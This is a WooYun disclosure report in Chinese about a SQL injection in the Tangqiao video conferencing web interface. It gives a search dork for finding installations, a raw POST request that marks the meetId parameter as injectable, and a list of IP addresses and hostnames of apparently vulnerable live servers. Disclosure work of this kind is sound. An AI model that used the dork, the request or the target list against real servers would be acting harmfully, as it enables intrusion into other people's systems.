wybug_title: 某视频会议系统存在通用型SQL注入（一）
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-03-23：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-05-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：   WooYun: 某视频会议系统存在严重信息泄露+通用的SQL注入 唐桥视频会议谷歌：inurl:web_meeting/index.php
POST /common/web_meeting/index.php?module=fast_join HTTP/1.1Accept: application/x-shockwave-flash, image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/xaml+xml, application/x-ms-xbap, application/x-ms-application, */*Referer: http://huizhi2000.xicp.net/common/web_meeting/index.php?module=join_meeting&userId=1&siteId=10Accept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 3.0.04320; .NET CLR 2.0.50727)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: huizhi2000.xicp.netContent-Length: 53Proxy-Connection: Keep-AlivePragma: no-cacheCookie: lan=zh-cn; mtUserLanguage1=zh-cn; PHPSESSID=5d20ef872ff5e29023acb27ca5865e46meetId=1111&nickName=aaaaaaa&passWord2=aaaaaaaaaaaaaa
   漏洞证明：  
Parameter: meetId (POST)


案例：
http://huizhi2000.xicp.net/common/web_meeting/index.php?module=bulletin_boardhttp://211.153.76.137/common/web_meeting/index.php?offsetadd=1&day=10&min=03&year=2015http://218.108.168.75/common/web_meeting/index.php?module=meeting_info&userId=1&meetId=817308456&siteId=10http://218.108.168.75/common/web_meeting/index.php?module=meeting_info&meetId=811199287&userId=1&siteId=10&meetingType=2http://111.11.183.88/common/web_meeting/index.php?module=meeting_roomhttp://115.236.34.51:9080/common/web_meeting/index.php?module=join_meeting&userId=1&siteId=10
   修复方案：  过滤   版权声明：转载请注明来源 YY-2012@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
